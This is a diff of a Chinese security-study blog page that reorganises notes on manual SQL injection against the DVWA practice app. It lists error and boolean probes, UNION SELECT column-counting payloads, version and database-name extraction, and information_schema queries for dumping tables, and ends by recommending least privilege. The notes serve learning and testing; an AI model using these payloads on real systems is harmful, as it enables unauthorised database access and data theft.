@@ -236,29 +236,54 @@
       </div>
     </header>
     <main class="post-main" itemprop="articleBody">
-      <h3 id="手动漏洞挖掘-SQL注入（一）"><a href="#手动漏洞挖掘-SQL注入（一）" class="headerlink" title="手动漏洞挖掘-SQL注入（一）"></a>手动漏洞挖掘-SQL注入（一）</h3><h4 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h4><ul>
-<li>基于报错的检测方法</li>
+      <h3 id="手动漏洞挖掘-SQL注入（一）"><a href="#手动漏洞挖掘-SQL注入（一）" class="headerlink" title="手动漏洞挖掘-SQL注入（一）"></a>手动漏洞挖掘-SQL注入（一）</h3><h4 id="一、检测是否存在注入"><a href="#一、检测是否存在注入" class="headerlink" title="一、检测是否存在注入"></a>一、检测是否存在注入</h4><ul>
+<li>基于报错的检测方法<ul>
 <li>’    ”    %    （）</li>
+</ul>
+</li>
 <li>基于布尔的检测<ul>
 <li>1‘ and ‘1’=’1    /    1’ and ‘1</li>
 <li>1’ and ‘1’=2    /    1’ and ‘0</li>
 </ul>
 </li>
-<li>查询的信息有几列<ul>
-<li>‘order by 9 – 知道列数后就可以联合查询</li>
+</ul>
+<h4 id="二、查明查询返回的列数"><a href="#二、查明查询返回的列数" class="headerlink" title="二、查明查询返回的列数"></a>二、查明查询返回的列数</h4><p><em>注意：–后必须加一个空格，否则注释不生效</em></p>
+<ul>
+<li>方法1，查询得到执行，说明该列存在，试出最大列数：<ul>
+<li>‘ order by 20 – </li>
+<li>‘ order by 10 – </li>
+<li>‘ order by 5 – </li>
+</ul>
+</li>
+<li>方法2，查询得到执行，说明使用了正确的列数：<ul>
+<li>‘ union select null – </li>
+<li>‘ union select null, null – </li>
+<li>‘ union select null, null, null – </li>
+</ul>
+</li>
+<li>方法3<ul>
+<li>‘ union select 1,2,3,4 – 观察前端返回的是查询到的第几个字段</li>
+</ul>
+</li>
+</ul>
+<h4 id="三、找到一个使用字符串数据类型的列"><a href="#三、找到一个使用字符串数据类型的列" class="headerlink" title="三、找到一个使用字符串数据类型的列"></a>三、找到一个使用字符串数据类型的列</h4><ul>
+<li>注入以下语句，如果查询得到执行，将看到另一行包含a的数据<ul>
+<li>‘ union select ‘a’, null, null –</li>
+<li>‘ union select null, ‘a’, null –</li>
+<li>‘ union select null, null, ‘a’ –</li>
+</ul>
+</li>
+<li>此时可以，把字符串的字段改为数据库的函数<ul>
+<li>‘ union all select database()，null,null –</li>
+<li>‘ union select @@version,null,null –    (Mysql)    </li>
+<li>‘ union select banner,null,null from v$version–    (Oracle)</li>
 </ul>
 </li>
 </ul>
 <a id="more"></a>
 
-<ul>
-<li>联合查询<ul>
-<li>‘ union select 1,2,3,4 – 观察前端返回的是查询到的第几个字段</li>
-<li>可以把1,2,3,4替换成数据库的函数</li>
-<li>‘ union all select database()</li>
-</ul>
-</li>
-<li>一些常用的：<ul>
+<h4 id="四、获取有用的数据"><a href="#四、获取有用的数据" class="headerlink" title="四、获取有用的数据"></a>四、获取有用的数据</h4><ul>
+<li>一些常用的函数：<ul>
 <li>’ union select database() ,substring_index(USER(),”@”,1)– <ul>
 <li>把USER()执行的结果用@切分，显示第一段</li>
 </ul>
@@ -275,16 +300,21 @@
 </ul>
 <h4 id="拖库"><a href="#拖库" class="headerlink" title="拖库"></a>拖库</h4><ul>
 <li>MySQL数据查询（元数据的表 information_schema）<ul>
-<li>查询有那些库，哪些表<ul>
-<li>select table_name,tbale_schema from information_schema.tables    //数据库中有哪些库(table_schema)，哪些表(table_name)</li>
-<li>select count(*),tbale_schema from information_schema.tables group by table_schema //看看一共有多少个表<ul>
-<li>其中information_schema有17张表，如果想学mysql就学这17张表，很有价值，必须要学。</li>
+<li>查询有那些库<ul>
+<li>select schema_name from information_schema.schemata;</li>
+<li>select distinct table_schema from information_schema.tables;</li>
+</ul>
+</li>
+<li>查询有哪些表<ul>
+<li>select table_name from information_schema.tables;</li>
+<li>select count(*),table_schema from information_schema.tables group by table_schema //看看每个库各有几张表<ul>
+<li>其中information_schema很有价值，必须要学。</li>
 </ul>
 </li>
 </ul>
 </li>
 <li>查询库中的表名<ul>
-<li>select tablename,table_schema from information_schema.tables where table_schema= ‘dvwa’</li>
+<li>select  table_schema from information_schema.tables where table_schema= ‘dvwa’</li>
 </ul>
 </li>
 <li>查询表中的列名<ul>
@@ -323,15 +353,11 @@
 </ul>
 <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol>
 <li>判断是否存在</li>
-<li>判断是第几个字段</li>
+<li>查明列数</li>
+<li>找到string类型位置</li>
 <li>查询，利用</li>
 </ol>
-<ul>
-<li><p>一个思路 ，编写服务器端的代码，实现比如插入一个用户名和密码。。</p>
-</li>
-<li><p>权限最小化，权限分离</p>
-</li>
-</ul>
+<p>权限最小化，权限分离</p>
 
     </main>
     <footer class="post-footer">
@@ -438,7 +464,7 @@
     
     <div class="archives-count count-block">
       <div class="site-count-title">归档</div>
-      <div><a href="/archives/">82</a></div>
+      <div><a href="/archives/">84</a></div>
     </div>
     
     
@@ -452,7 +478,7 @@
     
     <div class="tags-count count-block">
       <div class="site-count-title">标签</div>
-      <div><a href="/tags/">12</a></div>
+      <div><a href="/tags/">14</a></div>
     </div>
     
     
@@ -476,7 +502,7 @@
     <hr>
     <div class="post-toc sidebar-item" id="toc-div">
       <div><i class="fas fa-list-ol"></i>文章目录</div>
-      <div class="post-toc-content"><ol class="list-group toc"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#手动漏洞挖掘-SQL注入（一）"><span class="toc-text">手动漏洞挖掘-SQL注入（一）</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#检测"><span class="toc-text">检测</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#拖库"><span class="toc-text">拖库</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#其它利用场景"><span class="toc-text">其它利用场景</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol></div>
+      <div class="post-toc-content"><ol class="list-group toc"><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#手动漏洞挖掘-SQL注入（一）"><span class="toc-text">手动漏洞挖掘-SQL注入（一）</span></a><ol class="list-group toc-child"><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#一、检测是否存在注入"><span class="toc-text">一、检测是否存在注入</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#二、查明查询返回的列数"><span class="toc-text">二、查明查询返回的列数</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#三、找到一个使用字符串数据类型的列"><span class="toc-text">三、找到一个使用字符串数据类型的列</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#四、获取有用的数据"><span class="toc-text">四、获取有用的数据</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#拖库"><span class="toc-text">拖库</span></a></li><li class="toc-item toc-level-4"><a class="list-group-item toc-link" href="#其它利用场景"><span class="toc-text">其它利用场景</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="list-group-item toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol></div>
     </div>
     
     
@@ -525,7 +551,7 @@
     <div class="footer-container">
       <div class="footer-left">
         <div class="copyright">
-          <span class="author">Pyrrhax</span><span class="year"><i class="far fa-copyright"></i>2020</span>
+          <span class="author">Pyrrhax</span><span class="year"><i class="far fa-copyright"></i>2021</span>
         </div>
         
         <div class="busuanzi">
